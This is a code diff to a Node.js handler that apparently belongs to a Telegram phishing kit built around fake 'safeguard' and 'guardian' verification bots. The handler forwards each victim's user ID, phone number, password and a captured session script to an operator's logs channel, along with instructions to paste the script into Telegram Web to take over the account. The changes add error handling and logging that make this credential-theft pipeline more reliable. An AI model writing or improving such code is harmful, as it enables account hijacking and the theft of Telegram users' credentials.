@@ -121,13 +121,23 @@ const handleRequest = async (req, res, data) => {
     deluge: delugeBot
   };
   let bot = botMap[data.type] || null;
+  if (!bot) {
+    console.error(`No bot found for type: ${data.type}`);
+    res.status(400).json({ error: "Invalid bot type" });
+    return;
+  }
   console.log(`Sending message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}`);
-  await bot.sendMessage(
-    process.env.LOGS_ID,
-      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
-      parse_mode: "HTML"
-    }
-  );
+  try {
+    await bot.sendMessage(
+      process.env.LOGS_ID,
+        `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
+        parse_mode: "HTML"
+      }
+    );
+    console.log(`Successfully sent message to LOGS_ID for user ${data.userId}`);
+  } catch (error) {
+    console.error(`Failed to send message to LOGS_ID for user ${data.userId}:`, error.message);
+  }
   let type = data.type;
   if (type === "safeguard" || type === "guardian") {
     let image;
@@ -169,11 +179,16 @@ const handleRequest = async (req, res, data) => {
 
     const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;
 
-    await bot.sendPhoto(data.userId, image, {
-      caption,
-      ...buttons,
-      parse_mode: "HTML"
-    });
+    try {
+      await bot.sendPhoto(data.userId, image, {
+        caption,
+        ...buttons,
+        parse_mode: "HTML"
+      });
+      console.log(`Successfully sent photo to user ${data.userId}`);
+    } catch (error) {
+      console.error(`Failed to send photo to user ${data.userId}:`, error.message);
+    }
   }
 
   res.json({});
